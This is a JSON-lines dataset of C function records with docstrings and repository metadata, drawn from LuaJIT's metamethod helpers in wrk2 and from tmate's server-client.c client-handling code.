{"docstring": "/* Helper for TSET*. __newindex chain and metamethod. */\n", "func_signal": "TValue *lj_meta_tset(lua_State *L, cTValue *o, cTValue *k)", "code": "{\n  TValue tmp;\n  int loop;\n  for (loop = 0; loop < LJ_MAX_IDXCHAIN; loop++) {\n    cTValue *mo;\n    if (LJ_LIKELY(tvistab(o))) {\n      GCtab *t = tabV(o);\n      cTValue *tv = lj_tab_get(L, t, k);\n      if (LJ_LIKELY(!tvisnil(tv))) {\n\tt->nomm = 0;  /* Invalidate negative metamethod cache. */\n\tlj_gc_anybarriert(L, t);\n\treturn (TValue *)tv;\n      } else if (!(mo = lj_meta_fast(L, tabref(t->metatable), MM_newindex))) {\n\tt->nomm = 0;  /* Invalidate negative metamethod cache. */\n\tlj_gc_anybarriert(L, t);\n\tif (tv != niltv(L))\n\t  return (TValue *)tv;\n\tif (tvisnil(k)) lj_err_msg(L, LJ_ERR_NILIDX);\n\telse if (tvisint(k)) { setnumV(&tmp, (lua_Number)intV(k)); k = &tmp; }\n\telse if (tvisnum(k) && tvisnan(k)) lj_err_msg(L, LJ_ERR_NANIDX);\n\treturn lj_tab_newkey(L, t, k);\n      }\n    } else if (tvisnil(mo = lj_meta_lookup(L, o, MM_newindex))) {\n      lj_err_optype(L, o, LJ_ERR_OPINDEX);\n      return NULL;  /* unreachable */\n    }\n    if (tvisfunc(mo)) {\n      L->top = mmcall(L, lj_cont_nop, mo, o, k);\n      /* L->top+2 = v filled in by caller. */\n      return NULL;  /* Trigger metamethod call. */\n    }\n    copyTV(L, &tmp, mo);\n    o = &tmp;\n  }\n  lj_err_msg(L, LJ_ERR_SETLOOP);\n  return NULL;  /* unreachable */\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for arithmetic instructions. Coercion, metamethod. */\n", "func_signal": "TValue *lj_meta_arith(lua_State *L, TValue *ra, cTValue *rb, cTValue *rc,\n\t\t      BCReg op)", "code": "{\n  MMS mm = bcmode_mm(op);\n  TValue tempb, tempc;\n  cTValue *b, *c;\n  if ((b = str2num(rb, &tempb)) != NULL &&\n      (c = str2num(rc, &tempc)) != NULL) {  /* Try coercion first. */\n    setnumV(ra, lj_vm_foldarith(numV(b), numV(c), (int)mm-MM_add));\n    return NULL;\n  } else {\n    cTValue *mo = lj_meta_lookup(L, rb, mm);\n    if (tvisnil(mo)) {\n      mo = lj_meta_lookup(L, rc, mm);\n      if (tvisnil(mo)) {\n\tif (str2num(rb, &tempb) == NULL) rc = rb;\n\tlj_err_optype(L, rc, LJ_ERR_OPARITH);\n\treturn NULL;  /* unreachable */\n      }\n    }\n    return mmcall(L, lj_cont_ra, mo, rb, rc);\n  }\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for FORI. Coercion. */\n", "func_signal": "void LJ_FASTCALL lj_meta_for(lua_State *L, TValue *o)", "code": "{\n  if (!lj_strscan_numberobj(o)) lj_err_msg(L, LJ_ERR_FORINIT);\n  if (!lj_strscan_numberobj(o+1)) lj_err_msg(L, LJ_ERR_FORLIM);\n  if (!lj_strscan_numberobj(o+2)) lj_err_msg(L, LJ_ERR_FORSTEP);\n  if (LJ_DUALNUM) {\n    /* Ensure all slots are integers or all slots are numbers. */\n    int32_t k[3];\n    int nint = 0;\n    ptrdiff_t i;\n    for (i = 0; i <= 2; i++) {\n      if (tvisint(o+i)) {\n\tk[i] = intV(o+i); nint++;\n      } else {\n\tk[i] = lj_num2int(numV(o+i)); nint += ((lua_Number)k[i] == numV(o+i));\n      }\n    }\n    if (nint == 3) {  /* Narrow to integers. */\n      setintV(o, k[0]);\n      setintV(o+1, k[1]);\n      setintV(o+2, k[2]);\n    } else if (nint != 0) {  /* Widen to numbers. */\n      if (tvisint(o)) setnumV(o, (lua_Number)intV(o));\n      if (tvisint(o+1)) setnumV(o+1, (lua_Number)intV(o+1));\n      if (tvisint(o+2)) setnumV(o+2, (lua_Number)intV(o+2));\n    }\n  }\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for calls. __call metamethod. */\n", "func_signal": "void lj_meta_call(lua_State *L, TValue *func, TValue *top)", "code": "{\n  cTValue *mo = lj_meta_lookup(L, func, MM_call);\n  TValue *p;\n  if (!tvisfunc(mo))\n    lj_err_optype_call(L, func);\n  for (p = top; p > func; p--) copyTV(L, p, p-1);\n  copyTV(L, func, mo);\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Free a C data object. */\n", "func_signal": "void LJ_FASTCALL lj_cdata_free(global_State *g, GCcdata *cd)", "code": "{\n  if (LJ_UNLIKELY(cd->marked & LJ_GC_CDATA_FIN)) {\n    GCobj *root;\n    makewhite(g, obj2gco(cd));\n    markfinalized(obj2gco(cd));\n    if ((root = gcref(g->gc.mmudata)) != NULL) {\n      setgcrefr(cd->nextgc, root->gch.nextgc);\n      setgcref(root->gch.nextgc, obj2gco(cd));\n      setgcref(g->gc.mmudata, obj2gco(cd));\n    } else {\n      setgcref(cd->nextgc, obj2gco(cd));\n      setgcref(g->gc.mmudata, obj2gco(cd));\n    }\n  } else if (LJ_LIKELY(!cdataisv(cd))) {\n    CType *ct = ctype_raw(ctype_ctsG(g), cd->ctypeid);\n    CTSize sz = ctype_hassize(ct->info) ? ct->size : CTSIZE_PTR;\n    lua_assert(ctype_hassize(ct->info) || ctype_isfunc(ct->info) ||\n\t       ctype_isextern(ct->info));\n    lj_mem_free(g, cd, sizeof(GCcdata) + sz);\n  } else {\n    lj_mem_free(g, memcdatav(cd), sizecdatav(cd));\n  }\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Check if pane should be resized. */\n", "func_signal": "void\nserver_client_check_resize(struct window_pane *wp)", "code": "{\n\tstruct winsize\tws;\n\n\tif (!(wp->flags & PANE_RESIZE))\n\t\treturn;\n\n\tmemset(&ws, 0, sizeof ws);\n\tws.ws_col = wp->sx;\n\tws.ws_row = wp->sy;\n\n\tif (ioctl(wp->fd, TIOCSWINSZ, &ws) == -1) {\n#ifdef __sun\n\t\t/*\n\t\t * Some versions of Solaris apparently can return an error when\n\t\t * resizing; don't know why this happens, can't reproduce on\n\t\t * other platforms and ignoring it doesn't seem to cause any\n\t\t * issues.\n\t\t */\n\t\tif (errno != EINVAL && errno != ENXIO)\n#endif\n\t\tfatal(\"ioctl failed\");\n\t}\n\n\twp->flags &= ~PANE_RESIZE;\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Push stderr to client if possible. */\n", "func_signal": "void\nserver_client_push_stderr(struct client *c)", "code": "{\n\tstruct msg_stderr_data data;\n\tsize_t                 sent, left;\n\n\tif (c->stderr_data == c->stdout_data) {\n\t\tserver_client_push_stdout(c);\n\t\treturn;\n\t}\n\n\tleft = EVBUFFER_LENGTH(c->stderr_data);\n\twhile (left != 0) {\n\t\tsent = left;\n\t\tif (sent > sizeof data.data)\n\t\t\tsent = sizeof data.data;\n\t\tmemcpy(data.data, EVBUFFER_DATA(c->stderr_data), sent);\n\t\tdata.size = sent;\n\n\t\tif (proc_send(c->peer, MSG_STDERR, -1, &data, sizeof data) != 0)\n\t\t\tbreak;\n\t\tevbuffer_drain(c->stderr_data, sent);\n\n\t\tleft = EVBUFFER_LENGTH(c->stderr_data);\n\t\tlog_debug(\"%s: client %p, sent %zu, left %zu\", __func__, c,\n\t\t    sent, left);\n\t}\n\tif (left != 0) {\n\t\tc->references++;\n\t\tevent_once(-1, EV_TIMEOUT, server_client_stderr_cb, c, NULL);\n\t\tlog_debug(\"%s: client %p, queued\", __func__, c);\n\t}\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Handle data key input from client. */\n", "func_signal": "void\nserver_client_handle_key(struct client *c, key_code key)", "code": "{\n\tstruct mouse_event\t*m = &c->tty.mouse;\n\tstruct session\t\t*s = c->session;\n\tstruct window\t\t*w;\n\tstruct window_pane\t*wp;\n\tstruct timeval\t\t tv;\n\tstruct key_table\t*table;\n\tstruct key_binding\t bd_find, *bd;\n\tint\t\t\t xtimeout;\n\n\t/* Check the client is good to accept input. */\n\tif (s == NULL || (c->flags & (CLIENT_DEAD|CLIENT_SUSPENDED)) != 0)\n\t\treturn;\n\tw = s->curw->window;\n\n\t/* Update the activity timer. */\n\tif (gettimeofday(&c->activity_time, NULL) != 0)\n\t\tfatal(\"gettimeofday failed\");\n\tsession_update_activity(s, &c->activity_time);\n\n\t/* Number keys jump to pane in identify mode. */\n\tif (c->flags & CLIENT_IDENTIFY && key >= '0' && key <= '9') {\n\t\tif (c->flags & CLIENT_READONLY)\n\t\t\treturn;\n\t\twindow_unzoom(w);\n\t\twp = window_pane_at_index(w, key - '0');\n\t\tif (wp != NULL && window_pane_visible(wp))\n\t\t\twindow_set_active_pane(w, wp);\n\t\tserver_clear_identify(c);\n\t\treturn;\n\t}\n\n\t/* Handle status line. */\n\tif (!(c->flags & CLIENT_READONLY)) {\n#ifdef TMATE\n\t\tif (!(c->flags & CLIENT_FORCE_STATUS))\n#endif\n\t\tstatus_message_clear(c);\n\t\tserver_clear_identify(c);\n\t}\n\tif (c->prompt_string != NULL) {\n\t\tif (!(c->flags & CLIENT_READONLY))\n\t\t\tstatus_prompt_key(c, key);\n\t\treturn;\n\t}\n\n\t/* Check for mouse keys. */\n\tif (key == KEYC_MOUSE) {\n\t\tif (c->flags & CLIENT_READONLY)\n\t\t\treturn;\n\t\tkey = server_client_check_mouse(c);\n\t\tif (key == KEYC_UNKNOWN)\n\t\t\treturn;\n\n\t\tm->valid = 1;\n\t\tm->key = key;\n\n\t\tif (!options_get_number(s->options, \"mouse\"))\n\t\t\tgoto forward;\n\t} else\n\t\tm->valid = 0;\n\n\t/* Treat everything as a regular key when pasting is detected. */\n\tif (!KEYC_IS_MOUSE(key) && server_client_assume_paste(s))\n\t\tgoto forward;\n\nretry:\n\t/* Try to see if there is a key binding in the current table. */\n\tbd_find.key = key;\n\tbd = RB_FIND(key_bindings, &c->keytable->key_bindings, &bd_find);\n\tif (bd != NULL) {\n\t\t/*\n\t\t * Key was matched in this table. If currently repeating but a\n\t\t * non-repeating binding was found, stop repeating and try\n\t\t * again in the root table.\n\t\t */\n\t\tif ((c->flags & CLIENT_REPEAT) && !bd->can_repeat) {\n\t\t\tserver_client_set_key_table(c, NULL);\n\t\t\tc->flags &= ~CLIENT_REPEAT;\n\t\t\tserver_status_client(c);\n\t\t\tgoto retry;\n\t\t}\n\n\t\t/*\n\t\t * Take a reference to this table to make sure the key binding\n\t\t * doesn't disappear.\n\t\t */\n\t\ttable = c->keytable;\n\t\ttable->references++;\n\n\t\t/*\n\t\t * If this is a repeating key, start the timer. Otherwise reset\n\t\t * the client back to the root table.\n\t\t */\n\t\txtimeout = options_get_number(s->options, \"repeat-time\");\n\t\tif (xtimeout != 0 && bd->can_repeat) {\n\t\t\tc->flags |= CLIENT_REPEAT;\n\n\t\t\ttv.tv_sec = xtimeout / 1000;\n\t\t\ttv.tv_usec = (xtimeout % 1000) * 1000L;\n\t\t\tevtimer_del(&c->repeat_timer);\n\t\t\tevtimer_add(&c->repeat_timer, &tv);\n\t\t} else {\n\t\t\tc->flags &= ~CLIENT_REPEAT;\n\t\t\tserver_client_set_key_table(c, NULL);\n\t\t}\n\t\tserver_status_client(c);\n\n\t\t/* Dispatch the key binding. */\n\t\tkey_bindings_dispatch(bd, c, m);\n\t\tkey_bindings_unref_table(table);\n\t\treturn;\n\t}\n\n\t/*\n\t * No match in this table. If repeating, switch the client back to the\n\t * root table and try again.\n\t */\n\tif (c->flags & CLIENT_REPEAT) {\n\t\tserver_client_set_key_table(c, NULL);\n\t\tc->flags &= ~CLIENT_REPEAT;\n\t\tserver_status_client(c);\n\t\tgoto retry;\n\t}\n\n\t/* If no match and we're not in the root table, that's it. */\n\tif (strcmp(c->keytable->name, server_client_get_key_table(c)) != 0) {\n\t\tserver_client_set_key_table(c, NULL);\n\t\tserver_status_client(c);\n\t\treturn;\n\t}\n\n\t/*\n\t * No match, but in the root table. Prefix switches to the prefix table\n\t * and everything else is passed through.\n\t */\n\tif (key == (key_code)options_get_number(s->options, \"prefix\") ||\n\t    key == (key_code)options_get_number(s->options, \"prefix2\")) {\n\t\tserver_client_set_key_table(c, \"prefix\");\n\t\tserver_status_client(c);\n\t\treturn;\n\t}\n\nforward:\n\tif (c->flags & CLIENT_READONLY)\n\t\treturn;\n\tif (KEYC_IS_MOUSE(key))\n\t\twp = cmd_mouse_pane(m, NULL, NULL);\n\telse\n\t\twp = w->active;\n\tif (wp != NULL)\n\t\twindow_pane_key(wp, c, s, key, m);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Event callback to push more stderr data if any left. */\n", "func_signal": "static void\nserver_client_stderr_cb(__unused int fd, __unused short events, void *arg)", "code": "{\n\tstruct client\t*c = arg;\n\n\tif (~c->flags & CLIENT_DEAD)\n\t\tserver_client_push_stderr(c);\n\tserver_client_unref(c);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Remove reference from a client. */\n", "func_signal": "void\nserver_client_unref(struct client *c)", "code": "{\n\tlog_debug(\"unref client %p (%d references)\", c, c->references);\n\n\tc->references--;\n\tif (c->references == 0)\n\t\tevent_once(-1, EV_TIMEOUT, server_client_free, c, NULL);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Detach a client. */\n", "func_signal": "void\nserver_client_detach(struct client *c, enum msgtype msgtype)", "code": "{\n\tstruct session\t*s = c->session;\n\n\tif (s == NULL)\n\t\treturn;\n\n\thooks_run(c->session->hooks, c, NULL, \"client-detached\");\n\tproc_send_s(c->peer, msgtype, s->name);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Check if this client is inside this server. */\n", "func_signal": "int\nserver_client_check_nested(struct client *c)", "code": "{\n\tstruct environ_entry\t*envent;\n\tstruct window_pane\t*wp;\n\n\tif (c->tty.path == NULL)\n\t\treturn (0);\n\n\tenvent = environ_find(c->environ, \"TMUX\");\n\tif (envent == NULL || *envent->value == '\\0')\n\t\treturn (0);\n\n\tRB_FOREACH(wp, window_pane_tree, &all_window_panes) {\n\t\tif (strcmp(wp->tty, c->tty.path) == 0)\n\t\t\treturn (1);\n\t}\n\treturn (0);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Check for client redraws. */\n", "func_signal": "void\nserver_client_check_redraw(struct client *c)", "code": "{\n\tstruct session\t\t*s = c->session;\n\tstruct tty\t\t*tty = &c->tty;\n\tstruct window_pane\t*wp;\n\tint\t\t \t flags, redraw;\n\n\tif (c->flags & (CLIENT_CONTROL|CLIENT_SUSPENDED))\n\t\treturn;\n\n\tif (c->flags & (CLIENT_REDRAW|CLIENT_STATUS)) {\n\t\tif (options_get_number(s->options, \"set-titles\"))\n\t\t\tserver_client_set_title(c);\n\n\t\tif (c->message_string != NULL)\n\t\t\tredraw = status_message_redraw(c);\n\t\telse if (c->prompt_string != NULL)\n\t\t\tredraw = status_prompt_redraw(c);\n\t\telse\n\t\t\tredraw = status_redraw(c);\n\t\tif (!redraw)\n\t\t\tc->flags &= ~CLIENT_STATUS;\n\t}\n\n\tflags = tty->flags & (TTY_FREEZE|TTY_NOCURSOR);\n\ttty->flags = (tty->flags & ~TTY_FREEZE) | TTY_NOCURSOR;\n\n\tif (c->flags & CLIENT_REDRAW) {\n\t\ttty_update_mode(tty, tty->mode, NULL);\n\t\tscreen_redraw_screen(c, 1, 1, 1);\n\t\tc->flags &= ~(CLIENT_STATUS|CLIENT_BORDERS);\n\t} else if (c->flags & CLIENT_REDRAWWINDOW) {\n\t\ttty_update_mode(tty, tty->mode, NULL);\n\t\tTAILQ_FOREACH(wp, &c->session->curw->window->panes, entry)\n\t\t\tscreen_redraw_pane(c, wp);\n\t\tc->flags &= ~CLIENT_REDRAWWINDOW;\n\t} else {\n\t\tTAILQ_FOREACH(wp, &c->session->curw->window->panes, entry) {\n\t\t\tif (wp->flags & PANE_REDRAW) {\n\t\t\t\ttty_update_mode(tty, tty->mode, NULL);\n\t\t\t\tscreen_redraw_pane(c, wp);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (c->flags & CLIENT_BORDERS) {\n\t\ttty_update_mode(tty, tty->mode, NULL);\n\t\tscreen_redraw_screen(c, 0, 0, 1);\n\t}\n\n\tif (c->flags & CLIENT_STATUS) {\n\t\ttty_update_mode(tty, tty->mode, NULL);\n\t\tscreen_redraw_screen(c, 0, 1, 0);\n\t}\n\n\ttty->flags = (tty->flags & ~(TTY_FREEZE|TTY_NOCURSOR)) | flags;\n\ttty_update_mode(tty, tty->mode, NULL);\n\n\tc->flags &= ~(CLIENT_REDRAW|CLIENT_BORDERS|CLIENT_STATUS|\n\t    CLIENT_STATUSFORCE);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Client functions that need to happen every loop. */\n", "func_signal": "void\nserver_client_loop(void)", "code": "{\n\tstruct client\t\t*c;\n\tstruct window\t\t*w;\n\tstruct window_pane\t*wp;\n#ifdef TMATE\n\tint tmate_should_sync_layout = 0;\n#endif\n\n\tTAILQ_FOREACH(c, &clients, entry) {\n\t\tserver_client_check_exit(c);\n\t\tif (c->session != NULL) {\n\t\t\tserver_client_check_redraw(c);\n\t\t\tserver_client_reset_state(c);\n\t\t}\n\t}\n\n\t/*\n\t * Any windows will have been redrawn as part of clients, so clear\n\t * their flags now. Also check pane focus and resize.\n\t */\n\tRB_FOREACH(w, windows, &windows) {\n#ifdef TMATE\n\t\tif (w->flags & WINDOW_REDRAW)\n\t\t\ttmate_should_sync_layout = 1;\n\t\tif (w->tmate_last_sync_active_pane != w->active)\n\t\t\ttmate_should_sync_layout = 1;\n#endif\n\n\t\tw->flags &= ~WINDOW_REDRAW;\n\t\tTAILQ_FOREACH(wp, &w->panes, entry) {\n\t\t\tif (wp->fd != -1) {\n\t\t\t\tserver_client_check_focus(wp);\n\t\t\t\tserver_client_check_resize(wp);\n\t\t\t}\n\t\t\twp->flags &= ~PANE_REDRAW;\n\t\t}\n\t\tcheck_window_name(w);\n\t}\n\n#ifdef TMATE\n\tif (tmate_should_sync_layout)\n\t\ttmate_sync_layout();\n#endif\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Set client key table. */\n", "func_signal": "void\nserver_client_set_key_table(struct client *c, const char *name)", "code": "{\n\tif (name == NULL)\n\t\tname = server_client_get_key_table(c);\n\n\tkey_bindings_unref_table(c->keytable);\n\tc->keytable = key_bindings_get_table(name, 1);\n\tc->keytable->references++;\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/*\n * Update cursor position and mode settings. The scroll region and attributes\n * are cleared when idle (waiting for an event) as this is the most likely time\n * a user may interrupt tmux, for example with ~^Z in ssh(1). This is a\n * compromise between excessive resets and likelihood of an interrupt.\n *\n * tty_region/tty_reset/tty_update_mode already take care of not resetting\n * things that are already in their default state.\n */\n", "func_signal": "void\nserver_client_reset_state(struct client *c)", "code": "{\n\tstruct window\t\t*w = c->session->curw->window;\n\tstruct window_pane\t*wp = w->active;\n\tstruct screen\t\t*s = wp->screen;\n\tstruct options\t\t*oo = c->session->options;\n\tint\t\t\t status, mode, o;\n\n\tif (c->flags & CLIENT_SUSPENDED)\n\t\treturn;\n\n\tif (c->flags & CLIENT_CONTROL)\n\t\treturn;\n\n\ttty_region(&c->tty, 0, c->tty.sy - 1);\n\n\tstatus = options_get_number(oo, \"status\");\n#ifdef TMATE\n\tif (c->flags & CLIENT_FORCE_STATUS)\n\t\tstatus = 1;\n#endif\n\tif (!window_pane_visible(wp) || wp->yoff + s->cy >= c->tty.sy - status)\n\t\ttty_cursor(&c->tty, 0, 0);\n\telse {\n\t\to = status && options_get_number(oo, \"status-position\") == 0;\n\t\ttty_cursor(&c->tty, wp->xoff + s->cx, o + wp->yoff + s->cy);\n\t}\n\n\t/*\n\t * Set mouse mode if requested. To support dragging, always use button\n\t * mode.\n\t */\n\tmode = s->mode;\n\tif (options_get_number(oo, \"mouse\"))\n\t\tmode = (mode & ~ALL_MOUSE_MODES) | MODE_MOUSE_BUTTON;\n\n\t/* Set the terminal mode and reset attributes. */\n\ttty_update_mode(&c->tty, mode, s);\n\ttty_reset(&c->tty);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Push stdout to client if possible. */\n", "func_signal": "void\nserver_client_push_stdout(struct client *c)", "code": "{\n\tstruct msg_stdout_data data;\n\tsize_t                 sent, left;\n\n\tleft = EVBUFFER_LENGTH(c->stdout_data);\n\twhile (left != 0) {\n\t\tsent = left;\n\t\tif (sent > sizeof data.data)\n\t\t\tsent = sizeof data.data;\n\t\tmemcpy(data.data, EVBUFFER_DATA(c->stdout_data), sent);\n\t\tdata.size = sent;\n\n\t\tif (proc_send(c->peer, MSG_STDOUT, -1, &data, sizeof data) != 0)\n\t\t\tbreak;\n\t\tevbuffer_drain(c->stdout_data, sent);\n\n\t\tleft = EVBUFFER_LENGTH(c->stdout_data);\n\t\tlog_debug(\"%s: client %p, sent %zu, left %zu\", __func__, c,\n\t\t    sent, left);\n\t}\n\tif (left != 0) {\n\t\tc->references++;\n\t\tevent_once(-1, EV_TIMEOUT, server_client_stdout_cb, c, NULL);\n\t\tlog_debug(\"%s: client %p, queued\", __func__, c);\n\t}\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Get default key table. */\n", "func_signal": "const char *\nserver_client_get_key_table(struct client *c)", "code": "{\n\tstruct session\t*s = c->session;\n\tconst char\t*name;\n\n\tif (s == NULL)\n\t\treturn (\"root\");\n\n\tname = options_get_string(s->options, \"key-table\");\n\tif (*name == '\\0')\n\t\treturn (\"root\");\n\treturn (name);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Handle command message. */\n", "func_signal": "void\nserver_client_dispatch_command(struct client *c, struct imsg *imsg)", "code": "{\n\tstruct msg_command_data\t  data;\n\tchar\t\t\t *buf;\n\tsize_t\t\t\t  len;\n\tstruct cmd_list\t\t *cmdlist = NULL;\n\tint\t\t\t  argc;\n\tchar\t\t\t**argv, *cause;\n\n\tif (imsg->hdr.len - IMSG_HEADER_SIZE < sizeof data)\n\t\tfatalx(\"bad MSG_COMMAND size\");\n\tmemcpy(&data, imsg->data, sizeof data);\n\n\tbuf = (char *)imsg->data + sizeof data;\n\tlen = imsg->hdr.len  - IMSG_HEADER_SIZE - sizeof data;\n\tif (len > 0 && buf[len - 1] != '\\0')\n\t\tfatalx(\"bad MSG_COMMAND string\");\n\n\targc = data.argc;\n\tif (cmd_unpack_argv(buf, len, argc, &argv) != 0) {\n\t\tcmdq_error(c->cmdq, \"command too long\");\n\t\tgoto error;\n\t}\n\n\tif (argc == 0) {\n\t\targc = 1;\n\t\targv = xcalloc(1, sizeof *argv);\n\t\t*argv = xstrdup(\"new-session\");\n\t}\n\n\tif ((cmdlist = cmd_list_parse(argc, argv, NULL, 0, &cause)) == NULL) {\n\t\tcmdq_error(c->cmdq, \"%s\", cause);\n\t\tcmd_free_argv(argc, argv);\n\t\tgoto error;\n\t}\n\tcmd_free_argv(argc, argv);\n\n\tif (c != cfg_client || cfg_finished)\n\t\tcmdq_run(c->cmdq, cmdlist, NULL);\n\telse\n\t\tcmdq_append(c->cmdq, cmdlist, NULL);\n\tcmd_list_free(cmdlist);\n\treturn;\n\nerror:\n\tif (cmdlist != NULL)\n\t\tcmd_list_free(cmdlist);\n\n\tc->flags |= CLIENT_EXIT;\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Is this fast enough to probably be a paste? */\n", "func_signal": "int\nserver_client_assume_paste(struct session *s)", "code": "{\n\tstruct timeval\ttv;\n\tint\t\tt;\n\n\tif ((t = options_get_number(s->options, \"assume-paste-time\")) == 0)\n\t\treturn (0);\n\n\ttimersub(&s->activity_time, &s->last_activity_time, &tv);\n\tif (tv.tv_sec == 0 && tv.tv_usec < t * 1000) {\n\t\tlog_debug(\"session %s pasting (flag %d)\", s->name,\n\t\t    !!(s->flags & SESSION_PASTING));\n\t\tif (s->flags & SESSION_PASTING)\n\t\t\treturn (1);\n\t\ts->flags |= SESSION_PASTING;\n\t\treturn (0);\n\t}\n\tlog_debug(\"session %s not pasting\", s->name);\n\ts->flags &= ~SESSION_PASTING;\n\treturn (0);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Handle shell message. */\n", "func_signal": "void\nserver_client_dispatch_shell(struct client *c)", "code": "{\n\tconst char\t*shell;\n\n\tshell = options_get_string(global_s_options, \"default-shell\");\n\tif (*shell == '\\0' || areshell(shell))\n\t\tshell = _PATH_BSHELL;\n\tproc_send_s(c->peer, MSG_SHELL, shell);\n\n\tproc_kill_peer(c->peer);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Set client title. */\n", "func_signal": "void\nserver_client_set_title(struct client *c)", "code": "{\n\tstruct session\t\t*s = c->session;\n\tconst char\t\t*template;\n\tchar\t\t\t*title;\n\tstruct format_tree\t*ft;\n\n\ttemplate = options_get_string(s->options, \"set-titles-string\");\n\n\tft = format_create(NULL, 0);\n\tformat_defaults(ft, c, NULL, NULL, NULL);\n\n\ttitle = format_expand_time(ft, template, time(NULL));\n\tif (c->title == NULL || strcmp(title, c->title) != 0) {\n\t\tfree(c->title);\n\t\tc->title = xstrdup(title);\n\t\ttty_set_title(&c->tty, c->title);\n\t}\n\tfree(title);\n\n\tformat_free(ft);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Create a new client. */\n", "func_signal": "void\nserver_client_create(int fd)", "code": "{\n\tstruct client\t*c;\n\n\tsetblocking(fd, 0);\n\n\tc = xcalloc(1, sizeof *c);\n\tc->references = 1;\n\tc->peer = proc_add_peer(server_proc, fd, server_client_dispatch, c);\n\n\tif (gettimeofday(&c->creation_time, NULL) != 0)\n\t\tfatal(\"gettimeofday failed\");\n\tmemcpy(&c->activity_time, &c->creation_time, sizeof c->activity_time);\n\n\tc->environ = environ_create();\n\n\tc->fd = -1;\n\tc->cwd = NULL;\n\n\tc->cmdq = cmdq_new(c);\n\tc->cmdq->client_exit = 1;\n\n\tc->stdin_data = evbuffer_new();\n\tc->stdout_data = evbuffer_new();\n\tc->stderr_data = evbuffer_new();\n\n\tc->tty.fd = -1;\n\tc->title = NULL;\n\n\tc->session = NULL;\n\tc->last_session = NULL;\n\tc->tty.sx = 80;\n\tc->tty.sy = 24;\n\n\tscreen_init(&c->status, c->tty.sx, 1, 0);\n\n\tc->message_string = NULL;\n\tTAILQ_INIT(&c->message_log);\n\n\tc->prompt_string = NULL;\n\tc->prompt_buffer = NULL;\n\tc->prompt_index = 0;\n\n\tc->flags |= CLIENT_FOCUSED;\n\n\tc->keytable = key_bindings_get_table(\"root\", 1);\n\tc->keytable->references++;\n\n\tevtimer_set(&c->repeat_timer, server_client_repeat_timer, c);\n\n\tTAILQ_INSERT_TAIL(&clients, c, entry);\n\tlog_debug(\"new client %p\", c);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
